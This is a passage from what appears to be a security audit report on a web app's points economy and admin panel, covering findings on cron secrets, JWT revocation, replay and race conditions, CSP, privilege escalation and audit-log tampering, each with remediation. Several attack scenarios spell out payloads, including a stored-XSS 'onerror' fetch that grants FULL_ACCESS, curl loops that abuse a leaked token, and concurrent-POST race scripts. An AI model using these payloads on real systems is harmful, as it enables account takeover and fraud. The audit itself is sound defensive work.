A single `CRON_SECRET` env var is the only authenticator on all 7 cron endpoints. The check is `Authorization: Bearer ${CRON_SECRET}` with no HMAC of body+timestamp, no IP allowlist (Vercel cron IP range or otherwise), no per-job secret, and no rate limiting. The cron handlers run with system-level DB access — `expire-points` mutates `WalletTransaction`/`PointsBatch`, `sync-events` polls Luma and mutates `Event`, `cleanup` deletes data, etc. Any party that obtains this single bearer token gains unconstrained system-role write capability across the full application.

**Attack scenario:**
1. CRON_SECRET is leaked (committed to a forked branch, dumped in a Vercel build log shared in Slack, or extracted from a dev laptop's `.env.local`).
2. Attacker scripts: `for i in 1..1000; do curl -H "Authorization: Bearer $SECRET" https://app/api/cron/expire-points; done` — the points economy is destroyed in minutes.
3. Attacker also calls `/api/cron/sync-events` repeatedly — DoS of Luma API quota; potential lockout.
4. No log records *who* called the endpoints (bearer token has no actor), so attribution is impossible.

**Business impact:**
- Mass economic loss (points expired prematurely → user churn, swag inventory deadlocked).
- No forensics: cron handler invocations don't carry caller identity.
- Single-secret blast radius spans all 7 sensitive jobs.
- Recovery requires DB rollback + secret rotation + every cron handler re-auditing.

**Remediation:**
1. **Per-job secrets:** `CRON_SECRET_EXPIRE_POINTS`, `CRON_SECRET_SYNC_EVENTS`, etc. Each handler reads only its own.
2. **HMAC signature:** Header `X-Cron-Signature: hmac_sha256(secret, timestamp + body)`, with timestamp drift ≤ 5 min to prevent replay.
3. **Vercel-native auth:** Switch to Vercel's `vercel.json` cron + native Cron Auth (which Vercel internally signs).
4. **IP allowlist:** Reject requests not from Vercel cron IP ranges (when running on Vercel infra).
5. **Rate limit per endpoint** (e.g., 1 call per `schedule` window).
6. **AuditLog** every cron invocation: timestamp, endpoint, signature-valid/invalid, mutation-summary.

**Detection:**
- Alert if any `/api/cron/*` is hit > 2× in 1h (current schedule is hourly/daily).
- Alert if any cron endpoint is called from a non-Vercel IP.
- Alert if `expire-points` runs more than once in 24h.

---

### F-004: Role downgrade does not invalidate existing JWTs (30-day grace for revoked admins)

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (7.2) [estimate, post-revocation window]
**CWE:** CWE-613 (Insufficient Session Expiration)
**OWASP:** A07:2021 — Identification & Authentication Failures
**Affected roles:** any revoked or demoted admin / member
**Affected panels:** /core/* (entire admin surface)
**Categories:** Cat 1, Cat 3, Cat 5, Cat 11
**Location:** [lib/auth-options.ts:87-176](../../lib/auth-options.ts#L87-L176), [lib/auth-options.ts:198](../../lib/auth-options.ts#L198) (30-day maxAge)

**Description:**
NextAuth uses `strategy: "jwt"` with a 30-day `maxAge`. The `jwt` callback only runs at signin (or on explicit `trigger: "update"`); on every subsequent request, the existing JWT is decoded and trusted as-is. There is no `tokenVersion` counter, no server-side revocation list, and no DB re-validation of role/permissions on every privileged op. Therefore, when an admin is demoted, fired, or has permissions revoked, their existing JWT remains valid for up to 30 days. Logout only clears the cookie on the device that initiated logout — other devices retain the old JWT.

**Attack scenario:**
1. Alice (CORE admin) logs in 2026-04-15; her JWT expires 2026-05-15.
2. On 2026-05-04 an incident occurs and Alice is demoted (her `Member` row is soft-deleted or her permissions JSON is downgraded).
3. Alice's JWT is not invalidated. The `jwt` callback won't re-run because `user` is undefined on subsequent requests.
4. Alice continues to call admin APIs (`PUT /api/members/[id]/permissions`, `POST /api/wallet/adjust`, etc.) until 2026-05-15.
5. She self-grants new privileges to a sock-puppet account, then leaves; the sock puppet retains FULL_ACCESS even after Alice's downgrade is visible in the UI.

**Business impact:**
- Incident response cannot instantly revoke admin access — 30-day grace window for fired employees, compromised devices, leaked sessions.
- Insider-threat / disgruntled-employee scenarios become catastrophic.
- Combined with F-013 (audit log soft-delete), the abuse can be retroactively covered up.
- Combined with F-038 (SW caches /core HTML), revoked admin can browse cached admin UI without even needing live JWT.

**Remediation:**
1. Add `tokenVersion: Int @default(0)` to `Member`, `CommunityMember`, `PublicUser`. Increment on every permission/status change.
2. Embed `tokenVersion` in the JWT at issuance.
3. In `lib/permissions.ts` (or a NextAuth `jwt` callback wrapper), re-fetch `tokenVersion` from DB on every privileged route and compare; reject if mismatch.
4. Alternative: Drop JWT strategy and use NextAuth's `database` strategy with a `Session` model — server-side session lookup on each request becomes the natural revocation point.
5. Reduce `maxAge` to a sliding 7-day window; refresh on activity.
6. On any role/permission change, send a `logout-all` event to the affected user (e.g., write to a `RevokedSessions` Redis set checked in middleware).

**Detection:**
- For every `Member.update` where `permissions` or `deletedAt` changes, scan the next 30 days of API logs for that `token.id` — alert if the user makes any privileged call after the change timestamp.
- Daily reconciliation report: list of users whose JWT-cached permissions disagree with current DB permissions (requires session-store, so applies post-remediation).

---

### F-005: Idempotency key NOT enforced server-side — offline replay attacks on swag/quest/bounty

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (6.5) [estimate]
**CWE:** CWE-352 (CSRF, broad family for missing dedup), CWE-841 (Improper Enforcement of Behavioral Workflow)
**OWASP:** A04:2021 — Insecure Design
**Affected roles:** any authenticated user (member or public)
**Affected panels:** /swag, /quests, /bounty, /experiments (PWA-online and offline-replay paths)
**Categories:** Cat 12, Cat 15, Cat 28, Cat 30
**Location:** [lib/offlineStorage.ts:11-22](../../lib/offlineStorage.ts#L11-L22), [lib/offlineStorage.ts:79-114](../../lib/offlineStorage.ts#L79-L114), [app/api/swag/[id]/redeem/route.ts](../../app/api/swag/[id]/redeem/route.ts), [app/api/quests/[id]/completions/route.ts](../../app/api/quests/[id]/completions/route.ts), [app/api/bounty/submissions/route.ts](../../app/api/bounty/submissions/route.ts)

**Description:**
The PWA generates idempotency keys client-side and stores actions in IndexedDB. When the client comes online, `backgroundSync` POSTs the action — but the `Idempotency-Key` header is not included, and the server route handlers do not look for it. Therefore the server has no dedup; a determined attacker can replay any state-changing request multiple times by either re-queuing in IndexedDB, manually re-issuing the request via DevTools, or cURL after a real submission.

**Attack scenario (swag double-redeem):**
1. User submits swag-redemption while offline (cost: 100 points). IndexedDB stores `PendingAction` with client-generated `idempotencyKey: "purchase-hash123"`.
2. Network restores; `backgroundSync` POSTs `/api/swag/itemId/redeem`. Server processes: stock decrement, `spendPoints(100)`, `SwagOrder.create`. Returns 201.
3. Attacker now opens DevTools and re-issues the same `fetch` (or replays a saved cURL) — the request is identical; the server has no dedup.
4. Server processes again: stock decremented a second time; another 100 points debited; second `SwagOrder` row created.
5. Net: user paid 100 points, received 2 swag items.

**Business impact:**
- Direct economic loss: swag inventory drained at ½ cost; admin must manually reconcile.
- No `AuditLog` to detect (compounded by F-092 wallet not audited).
- Combined with F-023 (non-atomic stock+points): attacker can guarantee oversells via timing.
- Combined with F-009 (quest race): attacker farms double XP/points on every one-time quest.

**Remediation:**
1. **Server-side idempotency layer:** add `lib/idempotency.ts` that wraps mutating route handlers. Use a Redis or DB-backed store keyed by `Idempotency-Key` header (or by `(userEmail, route, hash(body))` if header missing). TTL ≥ 24h; cache the response so replays return identical 201.
2. Update `backgroundSync.ts` to forward `Idempotency-Key` header from the stored action.
3. Add `IdempotencyKey` Prisma model: `{ key, userEmail, route, responseStatus, responseBody, createdAt }` with `@@unique([key])`.
4. Wrap `swag/redeem`, `quests/completions`, `bounty/submissions`, `experiments/contributions`, `wallet/adjust`, `applications` POSTs with the idempotency middleware.

**Detection:**
- Alert if same `(userEmail, route, body-hash)` POST is observed within 60s window (post-remediation: alert as idempotency-cache hit, indicating retry).
- Reconcile `WalletTransaction` against `SwagOrder` weekly: orders with `(userEmail, swagItemId)` count > points_debited / cost suggest replay.

---

### F-006: PBKDF2 static salt in encryptedSession (cross-user rainbow table)

**Severity:** Critical
**CVSS 3.1:** AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N (5.4) [estimate, requires DB access]
**CWE:** CWE-759 (Use of a One-Way Hash without a Salt) — strictly: salt is constant, not absent
**OWASP:** A02:2021 — Cryptographic Failures
**Affected roles:** any user with an `encryptedSession` blob; attacker with DB read
**Affected panels:** all panels using encryptedSession
**Categories:** Cat 20
**Location:** [lib/encryptedSession.ts](../../lib/encryptedSession.ts)

**Description:**
PBKDF2 key derivation in `lib/encryptedSession.ts` uses a constant salt (compiled into the binary, identical for every user). PBKDF2 with a static salt allows an attacker who exfiltrates the encrypted blobs (e.g., DB dump) to precompute one rainbow table that covers every user — defeating PBKDF2's intended per-secret cost.

**Attack scenario:**
1. Attacker obtains DB dump (compromised backup, F-045 preview-DB-shared, leaked snapshot, etc.).
2. Attacker pulls the global PBKDF2 salt from the open-source repo or compiled artefact.
3. Attacker precomputes derived keys for a wordlist of likely user passwords/codes once, then maps that table to every user's encryptedSession.
4. All sessions become equally crackable per-cost-per-user, instead of per-cost-per-user×per-user.

**Business impact:**
- Mass-decryption of session blobs if DB is ever exfiltrated.
- Eliminates the *N*-times cost amplification PBKDF2 was supposed to provide.
- Compliance: DPDP / GDPR may flag as "inappropriate technical measure".

**Remediation:**
1. Generate a per-user random salt (≥ 16 bytes from `crypto.randomBytes`) and store alongside the encrypted blob.
2. Concatenate salt + ciphertext + tag in the stored field, parse on decryption.
3. Migration: re-encrypt existing rows on next user login (lazy migration); for inactive users, batch re-encrypt during a maintenance window.
4. Increase PBKDF2 iteration count to current OWASP recommendation (≥ 600,000 for SHA-256), or migrate to Argon2id.

**Detection:**
- N/A pre-breach (this is a quality/strength issue, not an active exploit indicator).
- Post-breach: monitor for unusual login patterns indicating credential reuse.

---

### F-007: No `/api/me/delete` endpoint — Right-to-Erasure unimplemented (GDPR Art. 17 / DPDP §13)

**Severity:** Critical (regulatory)
**CVSS 3.1:** N/A (compliance, not exploitability)
**CWE:** CWE-359 (Exposure of Private Information)
**OWASP:** A04:2021 — Insecure Design
**Affected roles:** all data subjects (users in EU, India, UK)
**Affected panels:** /api/me/* (no deletion route)
**Categories:** Cat 13, Cat 27
**Location:** [app/api/me/](../../app/api/me/) (route does not exist), [prisma/schema.prisma](../../prisma/schema.prisma) (no cascade design)

**Description:**
There is no `DELETE /api/me` route; users cannot erase their own data. The schema has `deletedAt` (soft-delete) on `Member`, `CommunityMember`, `PublicUser`, but no cascade strategy for related tables (`UserWallet`, `WalletTransaction`, `Application`, `QuestCompletion`, `BountySubmission`, `SwagOrder`, `SpeedrunRegistration`, `Notification`, `AuditLog.metadata`). Even if a user's PublicUser row is soft-deleted, plaintext PII persists in those child tables forever. GDPR Art. 17 and DPDP §13 require erasure on request within 30 days.

**Attack scenario (regulatory):**
1. EU user submits SAR/erasure request via email (since no in-app endpoint).
2. Engineering team has no automated path; manual SQL is the only option.
3. Manual SQL misses related tables (`AuditLog.metadata` PII, `Application.data` form-responses, IndexedDB on user device, Vercel Analytics records).
4. User complains to ICO/DPCI; investigation finds the deletion was incomplete.
5. Fine: up to €20M or 4% global turnover (GDPR); DPDP fine up to ₹250 crore.

**Business impact:**
- Direct regulatory fine exposure on first complaint.
- Inability to demonstrate "appropriate technical and organizational measures" (Art. 32).
- Customer trust loss in EU/UK markets.

**Remediation:**
1. Build `DELETE /api/me` with re-auth (password / 2FA challenge).
2. Map every PII-bearing table; produce a deterministic erasure cascade (hard-delete `PublicUser`/`Member`; null-out PII columns on related rows but retain the row for ledger integrity; tombstone in `AuditLog`).
3. Coordinate with Vercel Analytics: call their delete-by-userId API.
4. Document the erasure runbook + the DPA/ROPA per Art. 30.
5. Add an admin "Erasure dashboard" with audit log of who erased whom.

**Detection:**
- Track erasure requests in a `DeletionRequest` table; alert if any are open > 25 days (5-day SLA buffer before 30-day legal deadline).

---

### F-008: CSP includes `'unsafe-inline'` and `'unsafe-eval'` in script-src

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (8.3) [chained with stored XSS]
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers / CSP), CWE-79
**OWASP:** A05:2021 — Security Misconfiguration
**Affected roles:** any user; reflected/stored XSS vector becomes catastrophic
**Affected panels:** all
**Categories:** Cat 10, Cat 16, Cat 17, Cat 30
**Location:** [next.config.ts:29-43](../../next.config.ts#L29-L43)

**Description:**
The Content-Security-Policy header allows `'unsafe-inline'` and `'unsafe-eval'` in `script-src` (and `'unsafe-inline'` in `style-src`). These directives defeat the core XSS-mitigation that CSP exists to provide: any injected `<script>...</script>`, inline `onclick=`, `javascript:` URI, `eval()` or `new Function()` payload will execute. Combined with F-033 (innerHTML in playbooks/markdown editor) and F-075 (Luma data unsanitised), a stored-XSS in a single rich-text field becomes account-takeover-grade.

**Attack scenario:**
1. Attacker (member-tier) creates a playbook with content containing `<img src=x onerror="fetch('/api/members/me/permissions',{method:'PUT',body:JSON.stringify({permissions:{'*':'FULL_ACCESS'}})})">`.
2. Admin views the playbook → JS executes → admin's session calls the permission-grant endpoint, escalating attacker.
3. Without `unsafe-inline`/`unsafe-eval`, the same payload is blocked by the browser regardless of the sink-side bug.

**Business impact:**
- Single XSS sink → admin compromise (chained with F-011 single-admin escalation).
- All cookies (`__Secure-next-auth.session-token`) are `HttpOnly`, but `fetch()` from an XSS context already carries them, so HttpOnly does not help.

**Remediation:**
1. Move toward strict CSP: `script-src 'self' 'nonce-XXX' 'strict-dynamic'`. Generate per-request nonces in middleware, inject into `<Script nonce={nonce}>` tags.
2. Migrate Vercel Analytics + Speedrun Insights to nonce-aware loading (or self-host).
3. Drop `'unsafe-eval'` (audit which lib uses `eval()`; usually Webpack HMR, sometimes `framer-motion` in dev — both can be production-stripped).
4. Drop `'unsafe-inline'` from `style-src` after auditing inline `style=""` usage; migrate to Tailwind classes or styled-jsx with nonce.
5. Add `require-trusted-types-for 'script'` (see F-032) to mitigate DOM-XSS on top of source-side hardening.

**Detection:**
- CSP report-only mode for a week before enforcing strict CSP; collect violation reports at `/api/csp-report`.
- Block deploys if `next.config.ts` regresses (CI grep).

---

### F-009: Race condition on quest completion grant (one-time bypass via concurrent POST)

**Severity:** Critical (within points-economy context)
**CVSS 3.1:** AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N (5.3) [estimate]
**CWE:** CWE-362 (Concurrent Execution / Race Condition), CWE-841
**OWASP:** A04:2021 — Insecure Design
**Affected roles:** any authenticated user
**Affected panels:** /quests
**Categories:** Cat 12, Cat 28, Cat 30
**Location:** [app/api/quests/[id]/completions/route.ts:54-96](../../app/api/quests/[id]/completions/route.ts#L54-L96), [app/api/quests/completions/bulk-review/route.ts:34-47](../../app/api/quests/completions/bulk-review/route.ts#L34-L47)

**Description:**
For "one-time" quests with `proofRequired: false` (auto-approve path), the route executes:
1. `findUnique(questId_userEmail)` → checks for existing completion.
2. `prisma.questCompletion.create(...)` (status `pending`).
3. `earnReward(...)` — debits/credits the wallet.
4. `prisma.questCompletion.update(...)` — sets status `approved`, records `xpAwarded`/`pointsAwarded`.

Steps 2-4 are not wrapped in a single transaction with the uniqueness check. Two near-simultaneous POSTs both pass step 1 (`findUnique` returns null for both), then both proceed. The unique constraint on `(questId, userEmail)` will reject the second `create`, but the *first one might already have triggered a duplicate `earnReward` call by the time the second one rolls back* (depending on bulk-review path or race timing of `update→earnReward`). Net: double award.

**Attack scenario:**
1. Attacker scripts `for i in 1..10; do (curl -X POST /api/quests/Q1/completions ...) &; done` — 10 concurrent submissions of the same one-time quest.
2. Several requests pass the `findUnique` check.
3. Several `earnReward` calls fire before the unique-constraint violation surfaces in race-window (Postgres serializability is not Serializable by default; Prisma uses Read-Committed unless explicitly told).
4. Wallet inflated by N× single-quest reward.
5. Repeat across all auto-approve one-time quests in the catalog.

**Business impact:**
- Direct economic inflation; downstream swag drained.
- No audit trail (compounded by F-092).
- Leaderboard integrity compromised.

**Remediation:**
1. Wrap the uniqueness check + create + earnReward in a single `prisma.$transaction(... { isolationLevel: 'Serializable' })`.
2. Move `earnReward` into the same transaction as the `create`; use `tx.userWallet.update` instead of opening a nested TX.
3. For bulk-review, lock rows with `SELECT ... FOR UPDATE` (raw SQL) before approving and crediting.
4. Add a per-user-per-quest rate limit (1 attempt per 10s) as defense-in-depth.

**Detection:**
- Alert if `WalletTransaction` has > 1 entry with same `(userEmail, sourceId)` for a one-time quest within 60s.
- Periodic reconciliation: `SELECT userEmail, sourceId, COUNT(*) FROM WalletTransaction WHERE type='quest_reward' GROUP BY ... HAVING COUNT(*) > 1` for one-time quests.

---

### F-010: Cron job idempotency missing (timeout-retry double-execution of expire-points / sync-events)

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:H (6.0) [estimate]
**CWE:** CWE-362, CWE-754 (Improper Check for Unusual Conditions)
**OWASP:** A04:2021 — Insecure Design
**Affected roles:** Vercel cron / system; impacts all users
**Affected panels:** points/economy, events sync
**Categories:** Cat 9, Cat 12, Cat 28
**Location:** [app/api/cron/expire-points/route.ts](../../app/api/cron/expire-points/route.ts), [app/api/cron/sync-events/route.ts](../../app/api/cron/sync-events/route.ts), [vercel.json](../../vercel.json)

**Description:**
Vercel cron retries on 5xx or timeout (default 3 retries with backoff). The cron handlers (`expire-points`, `sync-events`, `cleanup`, `speedrun-status`) have no idempotency guard. If the function times out partway through a long iteration (e.g., after expiring 10,000 of 50,000 batches, the function hits the 60s Vercel limit), Vercel retries; the next invocation re-processes some batches that were already expired — `WalletTransaction` may double-record or `pointsBalance` may double-decrement (depending on whether the partial work was committed before timeout).

**Attack scenario / failure mode:**
1. `expire-points` runs nightly, processes 100k batches, takes 90s on a slow night.
2. Vercel kills it at 60s (default function timeout). Some batches were already updated and committed (in batches of 100, say).
3. Vercel retries; the second run sees the already-committed expirations (PointsBatch.expiredAt is set), but if the query doesn't filter `WHERE expiredAt IS NULL`, it re-processes them.
4. Wallet balances double-decremented; users complain of phantom losses.

**Business impact:**
- Silent economic loss to users; trust erosion.
- No alert (compounded by F-028).
- Reconciliation requires manual SQL forensics.

**Remediation:**
1. Make every cron handler idempotent: each iteration must filter on a "not-yet-processed" predicate (`WHERE expiredAt IS NULL`).
2. Use a `CronRunHistory` table: `{ runId, jobName, startedAt, endedAt, itemsProcessed, status }`. Skip if a run with the same logical "scheduled time" already succeeded.
3. Configure explicit `maxDuration` in `vercel.json` per function; choose ≥ headroom over actual p99 runtime.
4. Add chunked-processing with checkpointing: process 500 items, checkpoint, repeat — so a kill at any time leaves a consistent state.

**Detection:**
- Alert on `WalletTransaction` of `type='points_expired'` with `pointsAmount > 0` for the same user within the same cron-window.
- Alert if a cron run takes > 75% of `maxDuration`.

---

### F-011: Permission endpoint relies on cached JWT claim (admin revocation effective only after 30d)

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (7.2)
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
**OWASP:** A01:2021 — Broken Access Control
**Affected roles:** revoked CORE admin
**Affected panels:** /core/members
**Categories:** Cat 1, Cat 2, Cat 3, Cat 5
**Location:** [app/api/members/[id]/permissions/route.ts:19-26](../../app/api/members/[id]/permissions/route.ts#L19-L26)

**Description:**
`PUT /api/members/[id]/permissions` checks `session.user.permissions` (sourced from the JWT) for the `'*':'FULL_ACCESS'` claim. The JWT was issued at signin with the user's permissions snapshot from that moment; subsequent DB updates to that user's `permissions` JSON do not invalidate the JWT (this is the same root cause as F-004). Therefore an admin whose FULL_ACCESS is revoked can still call the permission-grant endpoint for up to 30 days using their cached JWT.

**Attack scenario:** See F-004 — same cache-staleness root cause; this finding is the *exploit endpoint* that turns the staleness into an escalation primitive.

**Business impact:** The endpoint is the highest-leverage admin action — granting FULL_ACCESS. A revoked admin can bootstrap a permanent backdoor (a sock-puppet account with FULL_ACCESS) before their JWT expires.

**Remediation:** Re-fetch `member.permissions` from DB at the top of every request to this endpoint; compare against JWT and reject if mismatch (this is in addition to, not instead of, F-004's tokenVersion approach). Implementing this single endpoint guard is a strong stopgap before the broader F-004 remediation lands.

**Detection:** Diff JWT-claimed permissions against DB permissions on every privileged route hit; log mismatches to an alert channel.

---

### F-012: Single super-admin (FULL_ACCESS) can self-grant or grant any privilege; no 4-eyes / SoD

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (7.2)
**CWE:** CWE-732 (Incorrect Permission Assignment), CWE-1220 (Insufficient SoD)
**OWASP:** A01:2021 — Broken Access Control
**Affected roles:** any FULL_ACCESS admin
**Affected panels:** /core/members
**Categories:** Cat 3, Cat 5, Cat 7, Cat 27, Cat 30
**Location:** [app/api/members/[id]/permissions/route.ts:19-46](../../app/api/members/[id]/permissions/route.ts#L19-L46)

**Description:**
The permission-grant endpoint accepts a single super-admin's signature as sufficient to grant `'*':'FULL_ACCESS'` to any other member — including themselves. No 4-eyes (second-approver) workflow exists; no audit-then-approve gate; no time-delay; no notification to other admins. A single compromised FULL_ACCESS session is total compromise.

**Attack scenario:**
1. Any FULL_ACCESS admin (or compromised admin per F-004 chain) calls `PUT /api/members/${self.id}/permissions` with `{ permissions: { '*': 'FULL_ACCESS' } }` — already had it, but proves the path.
2. Same admin grants FULL_ACCESS to a sock-puppet account.
3. Sock puppet deletes the original admin's audit trail (chain with F-013 audit-log soft-delete).
4. Original admin is later "fired" but sock puppet remains.

**Business impact:**
- No defense-in-depth against insider risk.
- Compliance frameworks (SOX, ISO 27001) require SoD on privilege grants.
- Single point of failure: 1 leaked FULL_ACCESS session = total compromise.

**Remediation:**
1. **4-eyes for FULL_ACCESS grants:** require two FULL_ACCESS approvers (one initiator, one approver) for any grant of `'*':'FULL_ACCESS'`.
2. **No self-grant:** explicit check that `targetMemberId !== session.user.id` for grants of FULL_ACCESS.
3. **Notification:** broadcast to a dedicated admin Slack channel (server-side, after F-001 remediation) on every privilege change.
4. **Time-delay:** queue privilege grants with a 1h cooling-off window; a second admin can cancel within that window.
5. **AuditLog**: every grant attempt (success or fail) logged with both approvers' IDs.

**Detection:**
- Alert immediately on any `permissions[*] = 'FULL_ACCESS'` mutation.
- Reconcile FULL_ACCESS count daily; alert if it grows unexpectedly.

---

### F-013: Audit log soft-delete + admin write path = compromised admin can erase tracks

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N (5.7)
**CWE:** CWE-117 (Improper Output Neutralization for Logs), CWE-778 (Insufficient Logging)
**OWASP:** A09:2021 — Security Logging & Monitoring Failures
**Affected roles:** any compromised admin OR DB-write attacker
**Affected panels:** /core/audit-log
**Categories:** Cat 1, Cat 7, Cat 25, Cat 27, Cat 30
**Location:** [prisma/schema.prisma:277-296](../../prisma/schema.prisma#L277-L296), [lib/audit.ts:34-64](../../lib/audit.ts#L34-L64)

**Description:**
`AuditLog` has a `deletedAt: DateTime?` column, allowing soft-delete. There is no Postgres trigger preventing UPDATE/DELETE on the table, and no off-platform replication (no Axiom/Splunk/DataDog mirror). A compromised admin (or anyone with DB write — F-014 NEXTAUTH_SECRET shared, F-045 preview DB shared) can soft-delete or modify entries to cover their tracks. Permission-change activity additionally goes to a separate `Log` table via `logActivity()` rather than `AuditLog` — splitting the audit surface and complicating forensics.

**Attack scenario:**
1. Malicious admin grants self points (F-022 admin self-grant unbounded).
2. Audit entry exists for the grant.
3. Admin runs `UPDATE "AuditLog" SET "deletedAt" = NOW() WHERE id = ...` (via any DB-write path).
4. Audit query (which filters `deletedAt IS NULL`) no longer returns the entry; forensics fail.

**Business impact:**
- Insider threats are unprovable post-hoc.
- SOC 2 / ISO 27001 / DPDP audit-trail-immutability requirement violated.
- Incident response loses ground truth.

**Remediation:**
1. **Remove `deletedAt`** from `AuditLog`; if archival is needed, partition by month.
2. **Postgres trigger:** `CREATE TRIGGER audit_log_immutable BEFORE UPDATE OR DELETE ON "AuditLog" FOR EACH ROW EXECUTE FUNCTION raise_immutable_error();`
3. **Off-platform sink:** mirror every `AuditLog` insert to an external append-only log service (Axiom/Splunk/CloudWatch). Cron-job a daily integrity check (count + latest-id + hash) reconciling DB vs. external.
4. **Hash chain:** add `prevHash` column; each insert hashes `(prevHash, payload)` — tampering becomes detectable.
5. **Unify**: route `logActivity()` permission-change writes into `AuditLog` instead of separate `Log`.

**Detection:**
- Daily reconciliation of `AuditLog` row-count + max(id) against off-platform mirror; alert on discrepancy.
- Postgres CDC stream into SIEM; alert on UPDATE/DELETE against AuditLog.

---

### F-014: NEXTAUTH_SECRET potentially shared between preview and prod deployments

**Severity:** Critical (if confirmed)
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0) [estimate, if confirmed]
**CWE:** CWE-798, CWE-540 (Inclusion of Sensitive Info in Source Code)
**OWASP:** A05:2021 — Security Misconfiguration
**Affected roles:** anyone able to deploy a preview branch
**Affected panels:** all
**Categories:** Cat 3, Cat 23, Cat 26, Cat 29
**Location:** [vercel.json](../../vercel.json), Vercel project env config (out of repo — open assumption)

**Description:**
Open assumption (cannot be verified from source alone): if Vercel preview deployments use the same `NEXTAUTH_SECRET` and `DATABASE_URL` as production, then any contributor with PR-merge or preview-deploy rights can issue JWTs valid against production, and read/write the production DB. Preview deployments typically run untrusted PR code with full env access.

**Attack scenario:**
1. Contributor (or a compromised contributor account) opens a PR adding a route `/api/dump` that prints `process.env` or runs `prisma.member.findMany()`.
2. Vercel auto-deploys the preview against prod env.
3. Attacker hits the preview URL, exfiltrates `NEXTAUTH_SECRET` and DB content.
4. Attacker forges JWTs for any `(email, role: 'CORE')` and accesses production with admin rights.

**Business impact:** Total system compromise via PR; arguably the highest-impact finding in the audit (if confirmed).

**Remediation:**
1. **Verify in Vercel UI:** confirm that `NEXTAUTH_SECRET`, `DATABASE_URL`, `CRON_SECRET`, `CLOUDINARY_API_SECRET`, `BLOB_READ_WRITE_TOKEN`, `LUMA_API_KEY`, `SMTP_PASS` are scoped *only* to "Production" env (not "Preview" or "Development").
2. Provision separate preview/staging DB and secrets.
3. Require admin approval (Vercel Deployment Protection) before preview deploys execute.
4. Document this in a `docs/deployment-checklist.md`.

**Detection:**
- Run `vercel env ls` and inspect Environment column for each secret.
- Add a startup check: `if (process.env.VERCEL_ENV === 'preview' && process.env.DATABASE_URL.includes('prod-host')) throw`.

---

### F-015: Vertical escalation — CORE user with `members:FULL_ACCESS` can self-grant `*:FULL_ACCESS`

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (7.2)
**CWE:** CWE-269 (Improper Privilege Management)
**OWASP:** A01:2021 — Broken Access Control
**Affected roles:** CORE with partial `members:FULL_ACCESS` permission
**Affected panels:** /core/members
**Categories:** Cat 3, Cat 5, Cat 7
**Location:** [app/api/members/[id]/permissions/route.ts:19-46](../../app/api/members/[id]/permissions/route.ts#L19-L46)

**Description:**
The endpoint's authorization gate accepts either `permissions['*'] === 'FULL_ACCESS'` *or* `permissions['default'] === 'FULL_ACCESS'`. There is no second check verifying the actor is allowed to grant the *target permission key* — so a CORE user with only `members:FULL_ACCESS` can issue a `PUT` setting their own `permissions = { '*': 'FULL_ACCESS' }`, escalating to global super-admin.

**Attack scenario:**
1. Alice has CORE role + `permissions: { 'members': 'FULL_ACCESS' }` (granted to manage member metadata).
2. Alice calls `PUT /api/members/${alice.id}/permissions` with body `{ permissions: { '*': 'FULL_ACCESS', 'members': 'FULL_ACCESS' } }`.
3. The auth gate sees `members:FULL_ACCESS` and approves.
4. DB writes the new permissions; on her next signin (or with cached JWT after F-004 remediation lands), Alice has global super-admin.

**Business impact:** Any CORE admin with *any* FULL_ACCESS scope is one HTTP call away from total privilege.

**Remediation:**
1. Tighten the check: only allow privilege grants if the actor has FULL_ACCESS at the level being granted (i.e., grants of `'*'` require the actor to currently hold `'*':'FULL_ACCESS'`).
2. Add explicit "no self-grant of higher privilege" rule.
3. Pair with F-012 4-eyes flow.

**Detection:** Alert on any `permissions['*']` mutation; alert on self-mutating permissions writes.

---

### F-016: Member.email returned to CORE without masking (mass PII enumeration risk)

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.9)
**CWE:** CWE-359 (Exposure of Private Information)
**OWASP:** A01:2021 — Broken Access Control / A04:2021
**Affected roles:** any CORE
**Affected panels:** /core/members (admin list)
**Categories:** Cat 6, Cat 13
**Location:** [app/api/members/route.ts](../../app/api/members/route.ts)

**Description:**
`GET /api/members` returns the full `Member` row including `email`, `permissions`, `signupIp`, `tags`, etc. to every CORE caller. There is no role-tier scoping; every CORE user can enumerate the entire admin/staff PII set. With 100+ members this is a meaningful PII trove if a single CORE account is compromised.

**Attack scenario:**
1. Junior CORE member's session is hijacked (phished, F-038 cached on shared device, etc.).
2. Attacker dumps `/api/members?page=1..N`, harvesting all admin emails + permission maps.
3. Attacker uses the permission map to identify the 1-2 super-admins and target them with spear-phishing (chained with F-001 webhook for spoofed Slack alerts).

**Business impact:** Privilege topology disclosure accelerates targeted attacks; PII leak.

**Remediation:**
1. Mask `email` in list views (e.g., `j***@team1.io`); show full email only on detail view, gated by activity log.
2. Strip `permissions`, `signupIp`, internal `tags` from the list response; only expose what the table view needs.
3. Audit every CORE read of `/api/members` (chained with F-029).

**Detection:** Alert if any single CORE pulls `> 50` member rows in 1h.

---

### F-017: SpeedrunRegistration CSV export streams unmasked PII; not logged, not rate-limited

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N (5.4)
**CWE:** CWE-359, CWE-770, CWE-778, CWE-1236
**OWASP:** A01:2021, A09:2021
**Affected roles:** CORE
**Affected panels:** /core/speedrun
**Categories:** Cat 6, Cat 7, Cat 13, Cat 19, Cat 25, Cat 27
**Location:** [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts)

**Description:**
